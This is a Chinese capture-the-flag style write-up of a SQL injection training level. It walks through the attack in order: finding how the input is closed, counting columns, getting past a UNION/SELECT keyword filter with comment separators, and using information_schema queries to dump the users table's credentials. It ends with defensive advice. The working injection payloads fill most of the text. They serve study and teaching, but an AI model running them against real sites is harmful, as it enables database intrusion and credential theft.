## 题目：less18

## 题目描述
页面标题写着 “Only Your UNION AND SELECT belong to us.”（你的 UNION 和 SELECT 都归我们管），意思是：后台把 UNION 和 SELECT 当成敏感词给过滤了。

## 解题思路
1. **参数是否能注入及闭合方式：**	单引号 ' 试探，看有没有报错；再试 ')
2. **原查询列数**：ORDER BY n 二分/递增，看页面何时“查不到”
3. **显示在页面上的列数：**	UNION SELECT 1,2,3，看回显数字
4. **union select 被过滤的解决方法：**	用 /**/ 或 UNION ALL SELECT 拆开关键词
5. **让后面的 ') LIMIT 0,1 不报错的方法：**	用 #（URL 里写 %23）或 -- 注释掉
6. **拿到表和字段的方法:**	查 information_schema 元数据，再 group_concat 拖数据

## 解题步骤
1. **确认回显**
   ```
   ?id=1
   ```
   回显内容：
   ```Your Login name:Dumb
      Your Password:Dumb
      Hint: Your Input is Filtered with following result: 1
   ```
2. **判断闭合方式**
   * **(踩坑记录)** `?id=1'`页面出现 PHP 警告：说明 SQL 语法出错（mysql_query 返回 false），注入点存在，且单引号破坏了语句。
   **注意** 这里看不到 MySQL 的报错原文，因为源码里 mysql_error() 那行被注释了，只漏出一个 PHP 警告。所以这关不能做报错注入，只能联合查询或盲注。
   * **应对** 加上 ') 和注释再试：
     ```
     ?id=1')%23          →  Your Login name:Dumb   （正常回显，闭合成功）
     ?id=1')%20and%201=1%23  →  Your Login name:Dumb
     ?id=1')%20and%201=2%23  →  无回显（只有 Hint 行）
     ```
3. **判断列数**
   ```
   ?id=1')%20order%20by%203%23    →  Your Login name:Dumb     ✅ 三列存在
   ?id=1')%20order%20by%204%23    →  只有 Warning，无回显      ❌ 第四列不存在
   ```
   **结论**：原查询共 3 列（SELECT * 展开后是 id、username、password 三列）。

4. **绕过过滤，找字段回显位**
   * **(踩坑记录)**  直接写 union select：`?id=1')%20union%20select%201,2,3%23`
     * 回显：`Hint: Your Input is Filtered with following result: 1')  1,2,3#`
     * 分析：union 和 select 两个词连同中间的空格一起被删掉了，SQL 变成 id=('1') 1,2,3，语法当然错。
   * **应对**:  换成注释符隔开
     ```
       ?id=-1')/**/union/**/select/**/1,2,3%23
     ```
 页面回显了 2 和 3 → 第 2、3 列会显示在页面上，第 1 列不回显。

5. **读库名、版本、当前用户**
把回显位 2 换成函数：
```
?id=-1')/**/union/**/select/**/1,database(),3%23      →  security
?id=-1')/**/union/**/select/**/1,version(),3%23       →  5.7.26
?id=-1')/**/union/**/select/**/1,user(),3%23          →  root@localhost
```
* 库名 security
* MySQL 版本 5.7.26（≥5.0，可以用 information_schema）
* 数据库账号 root@localhost（权限很高，属于配置不当）

6.  **读表名**
```
?id=-1')/**/union/**/select/**/1,group_concat(table_name),3
 from information_schema.tables where table_schema=database()%23
```

```
Your Login name:emails,referers,uagents,users
```
四张表：emails、referers、uagents、users。显然目标是 users。
group_concat() 把多行结果用逗号拼成一行，正好塞进一个回显位。 table_schema=database() 表示“只查当前库”，不加这个条件会把别的库的同名表也带出来。

7. **读字段名**
   ```
   ?id=-1')/**/union/**/select/**/1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273%23
   ```

```
Your Login name:id,username,password
```
0x7573657273 是 users 的十六进制写法（0x + 每个字符的 ASCII 码），这样写可以完全不用引号，在引号被过滤时特别好用。
等价写法：table_name='users'（这关引号没被过滤，两种都行）。

8. 拖数据
```
?id=-1')/**/union/**/select/**/1,group_concat(username,0x3a,password),3
    from users%23
```
0x3a 是冒号 :，用作用户名和密码的分隔符。实测回显：

```Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,
stupid:stupidity,superman:genious,batman:mob!le,admin:888888,admin1:admin1,
admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,
test'#:123456,admin'--+:123456,admin'#:123456
Your Password:3
```
## 知识点总结
**注入点判定与闭合**
  * 字符型注入先确定“外面包了什么”：'$id'、('$id')、"$id"……闭合符要完整复现，这关是 ')。
  * 判断手法：and 1=1（真）与 and 1=2（假）对比页面差异；真为正常、假为异常，说明注入生效。
  * 页面报错被关掉时，靠“回显有无”而不是“报错文本”判断。

* id=('$id') 决定闭合是 ')；LIMIT 0,1 决定要用 -1 让前半段为空；union\s+select 的单薄正则决定用 /**/ 或 UNION ALL 拆词；mysql_error() 被注释决定这关只能联合查询、不能报错注入。

**防御**
* 预处理语句（PDO / mysqli prepare + 绑定参数）—— 最根本，让数据永远不进入 SQL 语法层。
* 类型校验：id 本来就该是数字，用 intval() 或 ctype_digit() 强制转换，直接消灭字符型注入。
* 最小权限：数据库账号不应该用 root（这关就是 root@localhost，一旦注入等于整台 MySQL 沦陷）。
* 关闭错误回显：display_errors=Off，不要把 mysql_error()、文件路径回显给用户（这关的 Warning 就泄露了绝对路径 E:\phpStudy_64\...\index.php）。
* 不要用黑名单当唯一防线：黑名单永远可以变形绕过，白名单 + 参数化才是正解。
* 日志与监控：这关的代码会把每次输入写进 result.txt（fwrite($fp,'ID:'.$id."\n")），真实业务里这就是入侵检测的线索。
